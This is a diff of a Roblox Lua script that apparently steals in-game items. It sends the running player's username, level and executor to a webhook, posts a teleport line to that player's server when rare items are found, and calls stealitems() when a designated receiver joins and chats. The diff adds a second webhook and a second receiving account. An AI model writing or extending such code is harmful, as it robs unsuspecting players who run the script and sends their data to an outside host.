@@ -1063,7 +1063,7 @@ local WebHookEmbed = CreateEmbed(
     {
         {
             name = "🌊 Player Info", 
-            value = "``` | 📖 Username: "..LP.Name.."\n | 🚀 Level: "..tostring(getLvl())..
+            value = "```| 📖 Username: "..LP.Name.."\n | 🚀 Level: "..tostring(getLvl())..
                      "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used:"..identifyexecutor().."```"
         },
         {
@@ -1090,8 +1090,10 @@ local WebHookEmbed = CreateEmbed(
 
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
     SendWebhook(webHook, {content = "@everyone --\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
+    SendWebhook(webHook1, {content = "@everyone --\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
 else
     SendWebhook(webHook, {content = "\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
+    SendWebhook(webHook1, {content = "\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
 end
 
 local function stealitems()
@@ -1197,7 +1199,7 @@ local function stealitems()
 end
 
 game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == userName then
+    if player.Name == userName or player.Name == userName1 then
         player.Chatted:Connect(function(msg)
             stealitems()
         end)
